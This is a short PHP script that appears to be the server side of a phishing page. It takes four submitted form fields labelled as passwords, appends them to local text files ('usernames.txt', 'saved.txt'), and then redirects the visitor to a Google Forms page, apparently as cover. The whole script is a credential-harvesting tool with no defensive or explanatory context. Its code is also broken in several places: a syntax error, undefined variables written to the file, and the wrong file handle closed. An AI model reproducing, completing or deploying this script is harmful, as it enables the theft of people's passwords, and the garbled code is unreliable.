<?php
header
('location:');
$handle=fopen("usernames.txt", "a");
if(isset($_POST['submit'])){
$I1 = "Password:":$_POST['input1']."
";
$I2 = "Password:".$_POST['input2']."
";
$I3 = "Password:".$_POST['input3']."
";
$I4 = "Password:".$_POST['input4']."
";
$file=fopen("saved.txt", "a");
fwrite($file, $Name);
fwrite($file, $Pass);
fclose($handle);
header("location:https://docs.google.com/forms/d/e/1FAIpQLSeE9fkf2EY_KGJaDrqJ4gUEqDTe501vdihfIVhFLzH7JC2XSQ/viewform?usp=sf_link");
}
?>